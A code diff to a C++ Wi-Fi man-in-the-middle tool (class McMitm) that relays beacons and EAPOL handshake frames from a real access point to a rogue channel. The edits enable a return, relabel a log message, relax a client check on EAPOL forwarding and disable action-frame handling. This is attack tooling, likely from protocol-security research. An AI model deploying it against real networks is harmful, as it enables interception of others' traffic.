@@ -19,7 +19,7 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
         const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
         if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel)
             last_real_beacon = steady_clock::now();
-        // return
+        return;
     }
 
     const bool might_forward = clients.contains(addr1) &&
@@ -31,7 +31,7 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
     } else if(dot11.addr1() == client_mac){
         display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
     } else if(might_forward){
-        display_traffic(dot11, "Real channel", " -- MitM");
+        display_traffic(dot11, "Real channel", " -- MitM ap");
     }
 
     // Forward na rogue channel
@@ -77,7 +77,7 @@ bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const std::
 bool McMitm::handle_eapol_real(const HWAddress<6> addr2, const HWAddress<6> addr1, PDU &pdu){
    if(addr2 == ap_mac){
         // EAPOL od AP → forward na rogue channel
-        if(is_eapol(pdu) && clients.contains(addr1)){
+        if(is_eapol(pdu) /*&& clients.contains(addr1)*/){
             int eapol_msg = get_eapol_msg_num(pdu);
             log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
             send_to_rogue(pdu);
@@ -142,7 +142,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
     }
 
     if (handle_probe_real(addr2, *dot11)) return;
-    if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
+    //TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
     if(handle_eapol_real(addr2, addr1, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){
